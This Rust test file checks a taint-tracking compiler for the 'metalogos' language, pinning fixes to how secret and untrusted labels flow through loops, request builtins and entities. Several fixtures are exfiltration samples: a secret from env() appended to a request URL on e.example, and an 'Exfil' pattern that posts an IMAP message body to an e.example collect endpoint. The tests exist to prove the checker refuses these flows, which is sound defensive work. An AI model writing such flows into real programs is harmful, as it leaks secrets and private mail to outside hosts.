// ── №951 (issue #1918): the in-pattern label losses (threat-model B5–B8) ─
//
// №950 closed the pattern CALL boundary. The losses this naryad closes are
// INSIDE one pattern, and each had its own cause — none of them a missing
// rule, all of them a rule that was not reached:
//
//   B5  the `each` body's raises were DISCARDED at loop exit, while the
//       neighbouring `while` arm folded them back. The asymmetry was the
//       gap.
//   B6  `http_get` is classified `Role::Source`, so the sink gate never
//       looked at its arguments — and a GET's URL leaves the process.
//   B8  an entity seeded from string literals only, so a `Secret` type, an
//       `env()` initializer, and even an explicit `<private>` annotation
//       were all invisible to the gate.
//   plus the lattice's source vocabulary: 25 names written by hand against
//       153 `Role::Source` builtins in the registry.
//
// B7 (the flow output) is NOT here by decision, not by omission — see the
// note on `STILL_OPEN_PINS` in tests/naryad_948_boundary_pins.rs.

fn compile_errors(src: &str) -> Vec<String> {
    match metalogos::check_program(src) {
        Ok(result) => result
            .errors
            .iter()
            .map(|e| format!("{:?}", e))
            .collect::<Vec<_>>(),
        Err(e) => panic!("the fixture itself must parse: {e}"),
    }
}

// ── B5: the loop-exit fold ───────────────────────────────────────────────

/// The accumulator raised inside an `each` body keeps its label after the
/// loop. The mutation target: delete the fold and this goes green-to-red.
#[test]
fn n951_each_accumulator_keeps_the_label_after_the_loop() {
    let src = r#"
        pattern P(x: String) -> String {
            let mut acc = ""
            each c in split(env("SP"), "") { acc = acc + c }
            print(acc)
            return "ok"
        }
    "#;
    let errs = compile_errors(src);
    assert!(
        errs.iter().any(|m| m.contains("[PII_EGRESS_OUTPUT]")),
        "the `each` body's raises must fold back into the loop-exit environment, as the \
         `while` arm already does; got: {errs:?}"
    );
}

/// The INDEX-first form too. `each i, c in …` binds the index first and the
/// value second (`src/parser/stmt.rs`) — a detail that invalidated one of
/// the audit's own probes, so it is pinned here in the correct order.
#[test]
fn n951_each_with_index_folds_the_value_not_the_index() {
    let leaks = r#"
        pattern P(x: String) -> String {
            let mut acc = ""
            each i, c in split(env("SP"), "") { acc = acc + c }
            print(acc)
            return "ok"
        }
    "#;
    let errs = compile_errors(leaks);
    assert!(
        errs.iter().any(|m| m.contains("[PII_EGRESS_OUTPUT]")),
        "the VALUE of an indexed `each` carries the iterable's label; got: {errs:?}"
    );
}

/// The loop variable itself stays scope-local (the №323 `each` contract):
/// the fold must not leak the iterant into the outer scope.
#[test]
fn n951_the_loop_variable_does_not_escape_the_loop() {
    let src = r#"
        pattern P(x: String) -> String {
            let mut seen = "none"
            each c in split("abc", "") { seen = "yes" }
            print(seen)
            return "ok"
        }
    "#;
    let errs = compile_errors(src);
    assert!(
        errs.is_empty(),
        "a public loop over a literal must stay clean — the fold must carry labels, not \
         invent them; got: {errs:?}"
    );
}

// ── B6: the request side of a bidirectional builtin ──────────────────────

/// A secret in the URL of a request builtin refuses. The audit's pin B6.
#[test]
fn n951_a_secret_in_a_request_url_refuses() {
    for call in [
        r#"let r = http_get("https://e.example/?k=" + env("SP"))"#,
        r#"let r = web_search("find " + env("SP"))"#,
        r#"let r = http_download("https://e.example/?k=" + env("SP"), "f")"#,
    ] {
        let src = format!("pattern P(x: String) -> String {{ {call} return \"ok\" }}");
        let errs = compile_errors(&src);
        assert!(
            errs.iter().any(|m| m.contains("EGRESS_NETWORK")),
            "a secret in the request position must refuse ({call}); got: {errs:?}"
        );
    }
}

/// The narrowing is the point, and this is its mutation target: the CONTENT
/// family (`call_llm` and kin) is deliberately NOT gated here, because the
/// confidentiality clearance collides with the literal-marker rule of
/// ADR-0161 §3 — a prompt that merely MENTIONS «private» or «confidential»
/// would refuse. Widen the table to the content family and this goes red,
/// which is the signal that the collision is back.
#[test]
fn n951_a_prompt_literal_mentioning_private_is_not_a_refusal() {
    let src = r#"
        pattern P(x: String) -> String {
            let a = call_llm("summarize the private document")
            let b = call_llm("review this confidential report")
            return "ok"
        }
    "#;
    let errs = compile_errors(src);
    assert!(
        !errs.iter().any(|m| m.contains("EGRESS")),
        "asking a model about text is the language's primary use: a prompt LITERAL that \
         mentions a confidentiality word must not become an egress refusal; got: {errs:?}"
    );
}

/// And the integrity axis is not gated at the request position either:
/// sending the user's own message to a model is not an egress violation.
#[test]
fn n951_untrusted_text_may_be_sent_to_a_request_builtin() {
    let src = r#"
        pattern P(x: String) -> String {
            let r = web_search(x)
            return "ok"
        }
        mlogserver { port: 18301
          route "/s" method=GET { return respond("200", P(query_param("q"))) } }
    "#;
    let errs = compile_errors(src);
    assert!(
        !errs.iter().any(|m| m.contains("UNTRUSTED_EGRESS")),
        "the request position is gated on CONFIDENTIALITY only — untrusted text going out \
         is not the integrity axis's concern; got: {errs:?}"
    );
}

// ── B8: what seeds an entity ─────────────────────────────────────────────

/// All three facts seed an entity, and each one alone is enough. The
/// annotation case is the sharpest: the author wrote `<private>` and the
/// gate used to ignore it outright.
#[test]
fn n951_an_entity_seeds_from_annotation_type_and_initializer() {
    let cases = [
        (
            "the explicit annotation",
            r#"entity k: String<private> = "abc"
               pattern P(x: String) -> String { print(k) return "ok" }"#,
        ),
        (
            "the declared Secret type",
            r#"entity k: Secret = "abc"
               pattern P(x: String) -> String { print(to_string(k)) return "ok" }"#,
        ),
        (
            "a type alias of Secret",
            r#"type Token = Secret
               entity k: Token = "abc"
               pattern P(x: String) -> String { print(to_string(k)) return "ok" }"#,
        ),
        (
            "the initializer's own label",
            r#"entity k: String = env("SP")
               pattern P(x: String) -> String { print(k) return "ok" }"#,
        ),
    ];
    for (what, src) in cases {
        let errs = compile_errors(src);
        assert!(
            errs.iter().any(|m| m.contains("[PII_EGRESS_OUTPUT]")),
            "{what} must seed the entity's label; got: {errs:?}"
        );
    }
}

/// A public entity stays public — the seed must read facts, not assume.
#[test]
fn n951_a_public_entity_stays_public() {
    let src = r#"
        entity greeting: String = "hello"
        pattern P(x: String) -> String { print(greeting) return "ok" }
    "#;
    let errs = compile_errors(src);
    assert!(
        errs.is_empty(),
        "an ordinary literal entity must stay clean; got: {errs:?}"
    );
}

// ── The lattice's source vocabulary against the registry ─────────────────

/// The registry's `Label::Secret` and `Label::Network` source classes are
/// DERIVED, not hand-named: the hand-written vocabulary held 25 names while
/// the registry classifies 153 builtins as `Role::Source`, so 128 sources
/// entered the lattice as bottom — public and trusted.
#[test]
fn n951_registry_secret_and_network_sources_carry_their_class() {
    let secret_cases = [r#"print(env_or("SP", "d"))"#, r#"print(generate_key(32))"#];
    for call in secret_cases {
        let src = format!("pattern P(x: String) -> String {{ {call} return \"ok\" }}");
        let errs = compile_errors(&src);
        assert!(
            errs.iter().any(|m| m.contains("[PII_EGRESS_OUTPUT]")),
            "a registry `Label::Secret` source must enter the lattice private ({call}); \
             got: {errs:?}"
        );
    }

    // A `Label::Network` source brings REMOTE data in: untrusted, so an
    // output sink refuses it (the HTML/output integrity lane).
    let network_cases = [
        r#"let r = web_search("q") print(r)"#,
        r#"let r = weather("Minsk") print(r)"#,
    ];
    for call in network_cases {
        let src = format!("pattern P(x: String) -> String {{ {call} return \"ok\" }}");
        let errs = compile_errors(&src);
        assert!(
            !errs.is_empty(),
            "a registry `Label::Network` source brings untrusted remote data ({call}); \
             got a clean check"
        );
    }
}

/// `world_state` is EXCLUDED from the derivation, and that exclusion is a
/// decision with a reason, pinned so it cannot be undone by accident: the
/// project refuses its materialization at RUNTIME (№355/№691, ADR-0159 —
/// the conformance fixture `sst_001_world_state_materialization_refused`
/// states it in its first line), and a static refusal here would pre-empt
/// that and break the two examples that demonstrate it.
#[test]
fn n951_world_state_keeps_its_runtime_refusal() {
    let src = r#"
        pattern Snap(x: String) -> String {
            let d = device_open("embodied-mock-device")
            let w = world_state(d)
            print(w)
            return "unreachable"
        }
    "#;
    let errs = compile_errors(src);
    assert!(
        !errs.iter().any(|m| m.contains("EGRESS")),
        "world_state's materialization refusal belongs to the runtime layer (ADR-0159); a \
         static refusal here is an owner decision, not this naryad's; got: {errs:?}"
    );
}

/// The registry's `Internal` class is NOT derived, by the owner's decision
/// of 13.11 (variant 1 — name by name, in its own naryad). The reason it
/// cannot be derived: `default_label` is the CHANNEL class of №316, not a
/// lattice label, and `Internal` covers both «own store» (`recall`,
/// `kv_get`, `query`) and «untrusted request body» (`json_body` is itself
/// classified `Internal` and is named by hand as untrusted). 94 names and
/// 295 corpus uses hang on that distinction.
///
/// This test pins the CURRENT state so the change, when it comes, is
/// deliberate and arrives with its own migration — not as a side effect.
#[test]
fn n951_the_internal_class_is_not_derived_yet() {
    for call in [
        r#"print(recall("k"))"#,
        r#"print(kv_get("k"))"#,
        r#"print(query("SELECT 1"))"#,
    ] {
        let src = format!("pattern P(x: String) -> String {{ {call} return \"ok\" }}");
        let errs = compile_errors(&src);
        assert!(
            errs.is_empty(),
            "the `Internal` class stays bottom until the owner's name-by-name pass ({call}); \
             got: {errs:?}"
        );
    }
}

/// The two corrections the FULL SUITE caught and the corpus sweep could
/// not. Both are pinned, because both were my own rules overreaching.
///
/// (1) The derived `Label::Network` class must NOT shadow the №689
///     private-field rule. `expr_label` asks `label_source` first and
///     `registry_private_flow_label` only if it answered `None`, so
///     returning the network class for `imap_read` replaced
///     `private, trusted` with `public, untrusted` — a WEAKENING on the
///     confidentiality axis. A sweep that counts findings cannot see a
///     label getting weaker; the four `n689_imap_read_*` tests did.
///
/// (2) At a REQUEST position a bare string literal carries no program
///     data. The literal-marker rule of ADR-0161 §3 reads a literal's
///     wording («private», «internal») as «the destination is internal
///     infrastructure» — a rule about a SINK's address. At a request
///     position it turned the project's own hardening probe,
///     `http_get(".../private/data", {robots: true})`, into a static PII
///     refusal and hid the runtime's typed `[HTTP_ROBOTS_DENIED]`.
#[test]
fn n951_the_derivation_does_not_shadow_the_private_field_rule() {
    let src = r#"
        pattern Exfil(x: String) -> String {
            let mail = imap_read("INBOX", 1.0)
            let _ = http_post("https://e.example/collect", mail.body)
            return "sent"
        }
    "#;
    let errs = compile_errors(src);
    assert!(
        errs.iter()
            .any(|m| m.contains("PII_EGRESS") || m.contains("SECRET_EGRESS")),
        "a name carrying private FIELDS keeps the №689 private label — the network-class \
         derivation must not replace it with a weaker one; got: {errs:?}"
    );
}

#[test]
fn n951_a_literal_url_is_not_judged_by_its_wording() {
    let src = r#"
        pattern P(x: String) -> String {
            let r = http_get("http://127.0.0.1:9/private/data")
            return "ok"
        }
    "#;
    let errs = compile_errors(src);
    assert!(
        errs.is_empty(),
        "a URL the author typed is author text, not data that flowed from a source: pin B6 \
         is about `\"…?k=\" + env(...)`. Judging a literal path segment named `/private/` \
         as a leak hides the runtime's own typed refusal; got: {errs:?}"
    );
}

/// The request-egress table is CHECKED AGAINST THE REGISTRY, not trusted.
///
/// Every name in it must be a `Role::Source` classified `Label::Network` —
/// that is the fact the table rests on («this builtin sends a request to
/// produce its answer»). A typo in a row would silently disable the gate
/// for that builtin, and a row whose builtin is later reclassified would
/// keep gating on a fact that no longer holds. Both go red here.
#[test]
fn n951_every_request_egress_name_is_a_network_source_in_the_registry() {
    for name in metalogos::semantic::REQUEST_EGRESS_NAMES {
        let class = metalogos::builtins_classification::classify(name).unwrap_or_else(|| {
            panic!(
                "`{name}` is in REQUEST_EGRESS_NAMES but is not in the \
                 registry at all — a typo disables the gate silently"
            )
        });
        assert_eq!(
            (class.role, class.default_label),
            (
                metalogos::builtins_classification::Role::Source,
                metalogos::builtins_classification::Label::Network
            ),
            "`{name}` is in REQUEST_EGRESS_NAMES, whose premise is `Role::Source` + \
             `Label::Network` (it sends a request to produce its answer); the registry now \
             says {:?}. Either the row or the classification is wrong — the table must not \
             gate on a fact that no longer holds",
            (class.role, class.default_label)
        );
    }
}
